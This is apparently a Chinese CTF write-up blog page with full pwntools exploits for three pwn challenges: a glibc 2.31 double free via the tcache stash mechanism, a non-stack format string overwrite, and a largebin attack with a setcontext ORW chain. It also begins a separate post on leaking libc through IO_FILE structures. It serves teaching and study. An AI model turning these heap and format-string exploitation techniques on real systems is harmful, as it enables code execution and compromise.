所以我们想要让一个chunk进入unsortedbin 要么就申请超出tcachebin范围 即0x400以上大小的chunk 或者填满tcachebin的一个链表 然后再次释放 如果超出fastbin的范围就会被放入unsortedbin 这里采取第二种办法 from pwn import*context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./vuln&quot;)#io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)io = remote(&quot;week-2.hgame.lwsec.cn&quot;,32435)def add(index,size,content): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content: &quot;) io.sendline(content)def delete(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))for i in range(0,8): add(i,0x80,b&#x27;aaaa&#x27;)for i in range(0,7): delete(i)delete(7)show(7)main_arena = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = main_arena-96-0x1ECB80 接下来我们的思路要放在如何篡改free_hook来获取shell 没有edit函数的情况下 又有UAF 我们很容易想到的是利用double free来做到任意地址写 但是2.31的版本 glibc对于double free的检查机制更加严格了 typedef struct tcache_entry&#123; struct tcache_entry *next; //链表指针，对应chunk中的fd字段 /* This field exists to detect double frees. */ struct tcache_perthread_struct *key; //指向所属的tcache结构体，对应chunk中的bk字段&#125; tcache_entry; 对于每一个tcache都有一个key指针指向 借助这个key指针 plmalloc可以更好的对double free进行检查 size_t tc_idx = csize2tidx(size);//只要tcache不为空 并且free chunk在tcache范围中 都需要进行double free检查 if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; /* Check to see if it&#x27;s already in the tcache. */ tcache_entry *e = (tcache_entry *)chunk2mem(p); /* 如果是这个chunk已经被放入tcache 那么key字段就已经有数据了 会被识别出来 */ if (__glibc_unlikely(e-&gt;key == tcache))//汇报错误信息 &#123; tcache_entry *tmp; LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) malloc_printerr(&quot;free(): double free detected in tcache 2&quot;); &#125; if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) //通过检查，放入tcahce中 &#123; tcache_put(p, tc_idx); return; &#125; &#125; 所以 如果我们还想要使用tcache double free的话 就只能修改key字段 或者是fastbin double free 但是由于fastbin对于chunk的取出有着size域的检查 相对来说不好办 但是在2.27.9版本以后 tcache新增了stash机制 要想明白这个机制的用处 我们先要清楚tcachebin的设计目的是什么 在多线程的情况下 plmalloc会遇到主分配区被抢占的问题 只能等待或者是申请一个非主分配区 针对这种情况 plmalloc为每个线程都涉及一个缓冲区 即tcache 而stash机制就是 如果用户申请一个0x60大小的chunk tcache里面没有的话 就会进入分配区处理 如果在fastbin中找到可以被申请的0x60chunk 系统就会认为将来还需要0x60大小的chunk 就会将fastbin中相同大小的chunk全部放入tcachebin中 因此我们利用这个手法就可以实现 在fastbin中实现double free 而在tcache中进行任意地址chunk的申请 完整exp: from pwn import*context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./vuln&quot;)#io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)io = remote(&quot;week-2.hgame.lwsec.cn&quot;,32435)def add(index,size,content): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content: &quot;) io.sendline(content)def delete(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))for i in range(0,8): add(i,0x80,b&#x27;aaaa&#x27;) //chunk0-chunk6用来填满tcache chunk7用来泄露基址for i in range(0,7): delete(i)for i in range(0,7): add(i,0x30,b&#x27;aaaa&#x27;) //填满tcache 从而使chunk8和chunk9可以被放入fastbin 之所以index和前面的垃圾chunk一样 是因为 //程序对于delete函数进行了限制 只能释放index&lt;=0xf的chunkfor i in range(8,11): add(i,0x30,b&#x27;aaaa&#x27;)for i in range(0,7): delete(i)delete(7)show(7)main_arena = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = main_arena-96-0x1ECB80free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]delete(8)delete(9)delete(8)for i in range(0,7): add(i,0x30,b&#x27;aaaa&#x27;) //将原本的tcache 0x40的链表全部的chunk申请 使其为空 触发stash机制add(8,0x30,p64(free_hook))add(9,0x30,b&#x27;aaaa&#x27;)add(11,0x30,b&#x27;aaaa&#x27;)one_gadget = libc_addr + 0xe3b01add(12,0x30,p64(system_addr))add(13,0x10,b&#x27;/bin/sh&#x27;)delete(13)io.interactive() YukkuriSay非栈上格式化字符串漏洞题 checksec 查看一下保护机制发现还有canary机制 [!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: &#x27;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/&#x27; 由于本人没有安装libc2.31以上版本的ubuntu 所以本地和远程的环境不一样 这里采用xclibc脚本更换二进制文件所依赖的libc GitHub - ef4tless&#x2F;xclibc: A tool to change the libc environment of running files(一个在CTF比赛中用于切换题目运行libc环境的工具) xclibc -x pwn libc-2.31.so 再来看一下ida反编译出来的伪代码 unsigned __int64 vuln()&#123; int v1; // [rsp+8h] [rbp-118h] char s1[4]; // [rsp+Ch] [rbp-114h] BYREF char buf[264]; // [rsp+10h] [rbp-110h] BYREF unsigned __int64 v4; // [rsp+118h] [rbp-8h] v4 = __readfsqword(0x28u); puts(&quot;What would you like to let Yukkri say?&quot;); do &#123; v1 = read(0, buf, 0x100uLL); if ( buf[v1 - 1] == 10 ) buf[v1 - 1] = 0; print_str(buf); puts(&quot;anything else?(Y/n)&quot;); __isoc99_scanf(&quot;%2s&quot;, s1); &#125; while ( strcmp(s1, &quot;n&quot;) &amp;&amp; strcmp(s1, &quot;N&quot;) ); puts(&quot;Yukkri prepared a gift for you: &quot;); read(0, str, 0x100uLL); printf(str); return __readfsqword(0x28u) ^ v4;&#125; 跟进一下print_str函数 int __fastcall print_str(const char *a1)&#123; int n; // [rsp+1Ch] [rbp-24h] int ii; // [rsp+20h] [rbp-20h] int l; // [rsp+24h] [rbp-1Ch] int m; // [rsp+28h] [rbp-18h] int i; // [rsp+2Ch] [rbp-14h] int k; // [rsp+30h] [rbp-10h] int v8; // [rsp+34h] [rbp-Ch] const char *j; // [rsp+38h] [rbp-8h] v8 = strlen(a1); if ( v8 &gt; 20 ) &#123; if ( v8 &gt; 50 ) &#123; printf(&quot;%*s&quot;, 51, (const char *)&amp;unk_402008); for ( i = 0; i &lt;= 51; ++i ) putchar(95); printf(&quot;\\n%*s/ %*s \\\\\\n&quot;, 50, (const char *)&amp;unk_402008, 50, (const char *)&amp;unk_402008); for ( j = a1; j &lt; &amp;a1[v8]; j += 50 ) printf(&quot;%*s| %-50.50s |\\n&quot;, 50, (const char *)&amp;unk_402008, j); printf(&quot;%*s\\\\___ &quot;, 50, (const char *)&amp;unk_402008); for ( k = 0; k &lt;= 46; ++k ) putchar(95); &#125; else &#123; printf(&quot;%*s&quot;, 51, (const char *)&amp;unk_402008); for ( l = 0; l &lt;= v8 + 1; ++l ) putchar(95); printf(&quot;\\n%*s/ %*s \\\\\\n&quot;, 50, (const char *)&amp;unk_402008, v8, (const char *)&amp;unk_402008); printf(&quot;%*s| %s |\\n&quot;, 50, (const char *)&amp;unk_402008, a1); printf(&quot;%*s\\\\___ &quot;, 50, (const char *)&amp;unk_402008); for ( m = 0; m &lt; v8 - 3; ++m ) putchar(95); &#125; &#125; else &#123; printf(&quot;%*s&quot;, 51, (const char *)&amp;unk_402008); for ( n = 0; n &lt;= 21; ++n ) putchar(95); printf(&quot;\\n%*s/ %*s \\\\\\n&quot;, 50, (const char *)&amp;unk_402008, 20, (const char *)&amp;unk_402008); printf( &quot;%*s| %*s%s%*s |\\n&quot;, 50, (const char *)&amp;unk_402008, (20 - v8) / 2 + v8 % 2, (const char *)&amp;unk_402008, a1, (20 - v8) / 2, (const char *)&amp;unk_402008); printf(&quot;%*s\\\\___ &quot;, 50, (const char *)&amp;unk_402008); for ( ii = 0; ii &lt;= 16; ++ii ) putchar(95); &#125; puts(&quot;/&quot;); printf(&quot;%*s|/\\n&quot;, 54, (const char *)&amp;unk_402008); return printf(&quot;%s&quot;, yukkuri);&#125; 直接看不好看懂 直接运行一下脚本 发现是一个图形 分析一下题目给我们的机会 首先是可以无限循环对栈上数据0x100字节大小的修改 并且还可以泄露栈上的数据 然后还有一次非栈上格式化字符串漏洞的机会 这题要想获取shell 只能通过覆盖ret addr 但是由于开启了canary 常规的栈溢出行不通 write泄露的栈内容长度又够不到canary 那么只能想办法通过非栈上格式化字符串漏洞来任意写到栈上的ret addr 使其为onegadget 这样就可以成功获取shell 那么我们就需要泄露栈地址和libc基址 gdb动调看一下 当我们输入的payload大于0x50字节的时候 断点打在0x4014EF处 我们发现payload&#x3D; cyclic(0x100)时 可以泄露出栈上的地址 当我们输入的payload &#x3D; cyclic(0x98)时 可以泄露出stderr的真实地址 我们成功获得了栈地址和libc基址 from pwn import *context.log_level = &quot;debug&quot;def splitaddr(target_addr): addr = [] curr = 0 for _ in range(4): num = target_addr % 65536 tmp = (num - curr + 65536) % 65536 addr.append(tmp) curr = (curr + tmp) % 65536 target_addr = target_addr &gt;&gt; 16 return addrio = process(&quot;./pwn&quot;)elf = ELF(&quot;./pwn&quot;)libc =ELF(&quot;./libc-2.31.so&quot;)io.recvuntil(&quot;What would you like to let Yukkri say?&quot;)payload = cyclic(0x98)io.send(payload)addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = addr - libc.sym[&#x27;_IO_2_1_stderr_&#x27;]success(hex(libc_addr))io.sendlineafter(&quot;anything else?(Y/n)&quot;,b&#x27;Y&#x27;)payload = cyclic(0x100)io.send(payload)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x8success(hex(stack_addr))io.sendlineafter(&quot;anything else?(Y/n)&quot;,b&#x27;Y&#x27;) 首先由于非栈上格式化字符串并没有办法直接对栈数据更改 所以我们还需要先修改栈上的数据 payload = p64(stack_addr)payload += p64(stack_addr+2)payload += p64(stack_addr+4)payload += p64(stack_addr+6)io.send(payload)io.sendlineafter(&quot;anything else?(Y/n)&quot;,b&#x27;n&#x27;) 非栈上格式化字符串会在栈专题中讲 所以这里就不解释为什么这么写了 最后的关键在于说ret addr的地址是在哪里 我们上面动调也可以看到 是位于stack_addr-0x8处 所以这里任意写其内容为onegadget 完整exp: from pwn import *context.log_level = &quot;debug&quot;def splitaddr(target_addr): addr = [] curr = 0 for _ in range(4): num = target_addr % 65536 tmp = (num - curr + 65536) % 65536 addr.append(tmp) curr = (curr + tmp) % 65536 target_addr = target_addr &gt;&gt; 16 return addrio = process(&quot;./pwn&quot;)elf = ELF(&quot;./pwn&quot;)libc =ELF(&quot;./libc-2.31.so&quot;)io.recvuntil(&quot;What would you like to let Yukkri say?&quot;)payload = cyclic(0x98)io.send(payload)addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = addr - libc.sym[&#x27;_IO_2_1_stderr_&#x27;]success(hex(libc_addr))io.sendlineafter(&quot;anything else?(Y/n)&quot;,b&#x27;Y&#x27;)payload = cyclic(0x100)io.send(payload)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x8success(hex(stack_addr))io.sendlineafter(&quot;anything else?(Y/n)&quot;,b&#x27;Y&#x27;)payload = p64(stack_addr)payload += p64(stack_addr+2)payload += p64(stack_addr+4)payload += p64(stack_addr+6)io.send(payload)io.sendlineafter(&quot;anything else?(Y/n)&quot;,b&#x27;n&#x27;)onegadget_addr = 0xe3b01+libc_addraddr = splitaddr(onegadget_addr)payload = b&quot;%&quot; + str(addr[0]).encode() + b&quot;lx%8$hn&quot;payload += b&quot;%&quot; + str(addr[1]).encode() + b&quot;lx%9$hn&quot;payload += b&quot;%&quot; + str(addr[2]).encode() + b&quot;lx%10$hn&quot;payload += b&quot;%&quot; + str(addr[3]).encode() + b&quot;lx%11$hn&quot;io.send(payload+b&#x27;\\x00&#x27;)io.interactive() note_context这题是赛后复现的 学到挺多东西 顺便巩固了setcontext的利用 保护全开 环境是2.32 并且开启了沙盒 经典菜单题 伪代码这里就不放了 一共给了四个函数 add函数可以申请chunk 大小限制在0x500-0x900 delete函数没有置零堆块指针 存在UAF show函数可以打印堆块内容 edit函数不存在堆溢出 根据最开始申请chunk时输入的size 由于对申请chunk的限制 一开始我们能考虑的只有unsortedbin attack 和 largebin attack 但是前者相对鸡肋 需要我们对任意申请地址已经有edit能力 后者也只能做到任意地址写堆地址 house of storm需要最后申请的chunk大小符合0x50链表 所以也没有办法 那么我们需要另寻出路 覆盖mp_.tcache_bins来使得size较大的chunk也能被释放到tcachebin中 从而可以打tcachebin attack 任意地址写 这里采用largebin attack任意写的那一套 我们先泄露基址 注意一下末尾00 需要覆盖一下 否则puts无法泄露 add(0,0x800)add(1,0x900)add(2,0x7f0)delete(0)edit(0,b&#x27;\\x01&#x27;)show(0)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1-96libc_addr = main_arena_addr - (libc.sym[&#x27;__malloc_hook&#x27;]+0x10)success(&quot;libc_addr :&quot;+hex(libc_addr))free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]edit(0,b&#x27;\\x00&#x27;) 顺便把chunk0释放到largebin后 泄露一下堆地址 因为这个版本已经有了fd异或保护机制 add(3,0x900)edit(0,cyclic(0x10))show(0)heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x290success(&quot;heap_addr :&quot;+hex(heap_addr)) mp_tcache_bins = libc_addr + 0x1e32d0success(&quot;mp_tcache_bins :&quot;+hex(mp_tcache_bins))payload = p64(0)+p64(mp_tcache_bins-0x10)+p64(0)+p64(mp_tcache_bins-0x20)edit(0,payload)delete(2)add(4,0x900) 然后就是largebin attack的部分 此时mp_tcache_bins处已经被写入一个很大的值 小于这个值的都会被释放进tcachebin add(5,0x900)add(6,0x900)add(7,0x900)delete(5)delete(6)key = ( heap_addr + 0x3000 ) &gt;&gt;12success(&quot;key :&quot;+hex(key))edit(6,p64(key^(free_hook)))add(8,0x900)add(9,0x900) 接下来利用tcache 申请到free_hook的空间 接下来就是重头戏了 由于开启了沙盒 所以我们只能用orw来泄露flag 2.29以前 setcontext是通过rdi寄存器来寻址 相对来说很好控制 但是2.32是由rdx来寻址 我们需要想办法控制rdx寄存器的值 .text:000000000005306D mov rsp, [rdx+0A0h].text:0000000000053074 mov rbx, [rdx+80h].text:000000000005307B mov rbp, [rdx+78h].text:000000000005307F mov r12, [rdx+48h].text:0000000000053083 mov r13, [rdx+50h].text:0000000000053087 mov r14, [rdx+58h].text:000000000005308B mov r15, [rdx+60h].text:000000000005308F test dword ptr fs:48h, 2.text:000000000005309B jz loc_53156.text:0000000000053156 loc_53156: ; CODE XREF: .text:0000000000053156 mov rcx, [rdx+0A8h].text:000000000005315D push rcx.text:000000000005315E mov rsi, [rdx+70h].text:0000000000053162 mov rdi, [rdx+68h].text:0000000000053166 mov rcx, [rdx+98h].text:000000000005316D mov r8, [rdx+28h].text:0000000000053171 mov r9, [rdx+30h].text:0000000000053175 mov rdx, [rdx+88h] 利用ropper工具 可以搜索libc文件中的gadget 看看有没有能达到我们目的的 其中 我们找到了符合我们要求的 可以通过rdi的值来影响到rdx 如果调用free函数 那么rdi寄存器存的就是我们想要释放的堆块的用户地址 并且利用call指令 还可以进行下一步跳转 也就是跳转到setcontext上 ret_addr = libc_addr + 0x26699rdi_addr = libc_addr + 0x2858frsi_addr = libc_addr + 0x2ac3frdx_r12_addr = libc_addr + 0x114161rax_addr = libc_addr + 0x45580setcontext_addr = libc_addr + libc.sym[&#x27;setcontext&#x27;]+61gadget_addr = libc_addr + 0x000000000014b760chunk8_addr = heap_addr +0x36e0open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]success(hex(chunk8_addr))flag_addr = chunk8_addr + 0x10payload = b&#x27;./flag\\x00\\x00&#x27;+p64(chunk8_addr+0x10)+cyclic(0x10)+p64(setcontext_addr) chunk8_addr是包括了chunk头的首地址 这里主要来详细讲一下payload的构造 flag字符串是为了接下来的orw 第一条指令 mov rdx, qword ptr [rdi + 8] 此时rdi指向的是chunk8_addr+0x10的地址 再加8 也就是指向了chunk8_addr+0x18 取这个地址的值赋值给rdx 也就是在flag字符串后我们要存入想要控制的rdx值 这里选择是chunk8_addr+0x10 在接下来的setcontext rsp指针就会被赋值到chunk8_addr+0xb0 我们只要在那里进行下一步的构造即可 第二条指令没啥用 不用关注 看第三条 call qword ptr [rdx + 0x20] 此时的rdx对应的值为chunk8_addr+0x18 也就是说 setcontext的地址要被放到chunk8_addr+0x38处 随后 我们用垃圾数据填充 来到chunk8_addr + 0xb0处继续开始构造 payload = b&#x27;./flag\\x00\\x00&#x27;+p64(chunk8_addr+0x10)+cyclic(0x10)+p64(setcontext_addr)payload = payload.ljust(0xa0,b&#x27;\\x00&#x27;) + p64(chunk8_addr+0x10+0xa8)+p64(ret_addr)payload += p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(0) + p64(open_addr)payload += p64(rdi_addr) + p64(3) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_r12_addr) + p64(0x50) + p64(0) + p64(read_addr)payload += p64(rdi_addr) + p64(1) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_r12_addr) + p64(0x50) + p64(0) + p64(write_addr) 此时rcx的值是我们存入的ret指令 并且执行完push后 栈上会存放两个ret 接下来一直执行到setcontext的ret指令的时候 就会将栈上的ret弹入到rip寄存器中 顺延执行到pop rdi 我们就成功控制了程序执行流 成功获取flag 完整exp: from pwn import*from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28793)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so&quot;)#libc = ELF(&quot;./刷题/libc-2.27.so&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()def add(index,size): io.recvuntil(&quot;5. Exit&quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size))def delete(index): io.recvuntil(&quot;5. Exit&quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def edit(index,content): io.recvuntil(&quot;5. Exit&quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Content: &quot;) io.send(content)def show(index): io.recvuntil(&quot;5. Exit&quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))add(0,0x800)add(1,0x900)add(2,0x7f0)delete(0)edit(0,b&#x27;\\x01&#x27;)show(0)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1-96libc_addr = main_arena_addr - (libc.sym[&#x27;__malloc_hook&#x27;]+0x10)success(&quot;libc_addr :&quot;+hex(libc_addr))free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]edit(0,b&#x27;\\x00&#x27;)add(3,0x900)edit(0,cyclic(0x10))show(0)heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x290success(&quot;heap_addr :&quot;+hex(heap_addr))mp_tcache_bins = libc_addr + 0x1e32d0success(&quot;mp_tcache_bins :&quot;+hex(mp_tcache_bins))payload = p64(0)+p64(mp_tcache_bins-0x10)+p64(0)+p64(mp_tcache_bins-0x20)edit(0,payload)delete(2)add(4,0x900)add(5,0x900)add(6,0x900)add(7,0x900)delete(5)delete(6)key = ( heap_addr + 0x3000 ) &gt;&gt;12success(&quot;key :&quot;+hex(key))edit(6,p64(key^(free_hook)))add(8,0x900)add(9,0x900)# mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]ret_addr = libc_addr + 0x26699rdi_addr = libc_addr + 0x2858frsi_addr = libc_addr + 0x2ac3frdx_r12_addr = libc_addr + 0x114161rax_addr = libc_addr + 0x45580setcontext_addr = libc_addr + libc.sym[&#x27;setcontext&#x27;]+61gadget_addr = libc_addr + 0x000000000014b760chunk8_addr = heap_addr +0x36e0open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]success(hex(chunk8_addr))flag_addr = chunk8_addr + 0x10payload = b&#x27;./flag\\x00\\x00&#x27;+p64(chunk8_addr+0x10)+cyclic(0x10)+p64(setcontext_addr)payload = payload.ljust(0xa0,b&#x27;\\x00&#x27;) + p64(chunk8_addr+0x10+0xa8)+p64(ret_addr)payload += p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(0) + p64(open_addr)payload += p64(rdi_addr) + p64(3) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_r12_addr) + p64(0x50) + p64(0) + p64(read_addr)payload += p64(rdi_addr) + p64(1) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_r12_addr) + p64(0x50) + p64(0) + p64(write_addr)edit(8,payload)edit(9,p64(gadget_addr))# gdb.attach(io,&#x27;b *&#x27;+str(gadget_addr))# pause(0)delete(8)io.recv() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"iofile泄露libc基址","slug":"iofile泄露libc基址","date":"2023-01-01T09:21:57.000Z","updated":"2023-09-14T17:19:50.000Z","comments":true,"path":"2023/01/01/iofile泄露libc基址/","link":"","permalink":"http://example.com/2023/01/01/iofile%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9D%80/","excerpt":"","text":"部分堆题没有给予我们打印堆块中间的机会 这种情况下 无法通过unsortedbin来泄露基址 这里学习一种新办法 通过io file来泄露基址 在一个程序中 初始的文件描述符为1,2,3 分别对应着标准输入 标准输出 标准错误 当我们调用scanf函数或者read函数的时候 就会通过调用文件描述符0来从终端输入数据 也就意味着我们可以利用这一点来做到泄露数据 在linux系统中的IO库 存在FILE文件流来描述文件 其初始创建的三个文件stdin、stdout、stderr位于libc上 而接下来创建的位于堆中 并且其是一个单向链表结构 定义此结构体为_IO_FILE_plus struct _IO_FILE_plus&#123; _IO_FILE file; _IO_jump_t *vtable;&#125; libc2.23以后 有一个全局变量_IO_list_all 指向了FILE文件的链表头 随便打开一个程序 gdb看一下_IO_list_all的内容 pwndbg&gt; p /x *(struct _IO_FILE_plus *) _IO_list_all$14 = &#123; file = &#123; _flags = 0xfbad2086, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7ffff7dce760, _fileno = 0x2, _flags2 = 0x0, _old_offset = 0xffffffffffffffff, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = &#123;0x0&#125;, _lock = 0x7ffff7dcf8b0, _offset = 0xffffffffffffffff, _codecvt = 0x0, _wide_data = 0x7ffff7dcd780, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0x0, _unused2 = &#123;0x0 &lt;repeats 20 times&gt;&#125; &#125;, vtable = 0x7ffff7dca2a0&#125; 其中file结构中的_chain指向了下一个FILE文件 即stdout 而stdout指向stdin vtable则是一个指针 跟进一下其内容 pwndbg&gt; p _IO_file_jumps$19 = &#123; __dummy = 0, __dummy2 = 0, __finish = 0x7ffff7a6e2d0 &lt;_IO_new_file_finish&gt;, __overflow = 0x7ffff7a6f2b0 &lt;_IO_new_file_overflow&gt;, __underflow = 0x7ffff7a6efd0 &lt;_IO_new_file_underflow&gt;, __uflow = 0x7ffff7a70370 &lt;__GI__IO_default_uflow&gt;, __pbackfail = 0x7ffff7a71c00 &lt;__GI__IO_default_pbackfail&gt;, __xsputn = 0x7ffff7a6d8d0 &lt;_IO_new_file_xsputn&gt;, __xsgetn = 0x7ffff7a6d530 &lt;__GI__IO_file_xsgetn&gt;, __seekoff = 0x7ffff7a6cb30 &lt;_IO_new_file_seekoff&gt;, __seekpos = 0x7ffff7a70940 &lt;_IO_default_seekpos&gt;, __setbuf = 0x7ffff7a6c7f0 &lt;_IO_new_file_setbuf&gt;, __sync = 0x7ffff7a6c670 &lt;_IO_new_file_sync&gt;, __doallocate = 0x7ffff7a600b0 &lt;__GI__IO_file_doallocate&gt;, __read = 0x7ffff7a6d8b0 &lt;__GI__IO_file_read&gt;, __write = 0x7ffff7a6d130 &lt;_IO_new_file_write&gt;, __seek = 0x7ffff7a6c8b0 &lt;__GI__IO_file_seek&gt;, __close = 0x7ffff7a6c7e0 &lt;__GI__IO_file_close&gt;, __stat = 0x7ffff7a6d120 &lt;__GI__IO_file_stat&gt;, __showmanyc = 0x7ffff7a71d80 &lt;_IO_default_showmanyc&gt;, __imbue = 0x7ffff7a71d90 &lt;_IO_default_imbue&gt;&#125; 其指向了_IO_file_jumps结构 该结构为所有的FILE文件所共用 存储的是一些函数的指针 我们也可以通过修改这些函数指针或者在可写区域伪造一个vtable结构 不过本文不做介绍 自行了解 回到FILE文件结构体 你在一系列变量中可以找到_fileno 其对应的值就是文件描述符 这里也存在利用漏洞 pwndbg&gt; p _IO_2_1_stdin_$20 = &#123; file = &#123; _flags = -72540024, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 &#x27;\\000&#x27;, _shortbuf = &quot;&quot;, _lock = 0x7ffff7dcf8d0 &lt;_IO_stdfile_0_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7dcdae0 &lt;_IO_wide_data_0&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = &#x27;\\000&#x27; &lt;repeats 19 times&gt; &#125;, vtable = 0x7ffff7dca2a0 &lt;_IO_file_jumps&gt;&#125; 如果程序通过文件描述符4将flag的值读入 那么我们可以通过修改1 2 3文件描述符的值来达到攻击目的 这里同样不扩展 那么我们是如何通过FILE文件结构达到泄露基址的目的呢? 让我们阅读一下puts函数的源码 #include &quot;libioP.h&quot;#include &lt;string.h&gt;#include &lt;limits.h&gt;int_IO_puts (const char *str)&#123; int result = EOF; size_t len = strlen (str); _IO_acquire_lock (stdout); if ((_IO_vtable_offset (stdout) != 0 || _IO_fwide (stdout, -1) == -1) &amp;&amp; _IO_sputn (stdout, str, len) == len &amp;&amp; _IO_putc_unlocked (&#x27;\\n&#x27;, stdout) != EOF) result = MIN (INT_MAX, len + 1); _IO_release_lock (stdout); return result;&#125;weak_alias (_IO_puts, puts)libc_hidden_def (_IO_puts) 其调用了一个关键函数 _IO_sputn 我们需要跟进一下该函数 extern size_t _IO_new_file_xsputn (FILE *, const void *, size_t); 执行sputn函数的过程中同时执行了_IO_new_file_xsputn继续跟进发现 其调用了_IO_overflow函数 这个函数是否眼熟? 其存在于我们上面介绍的vtable结构中 最后我们来看起决定作用的_IO_new_file_overflow函数 int_IO_new_file_overflow (FILE *f, int ch)&#123; if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */ &#123; f-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; &#125; /* If currently reading or no buffer allocated. */ if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL) &#123; /* Allocate a 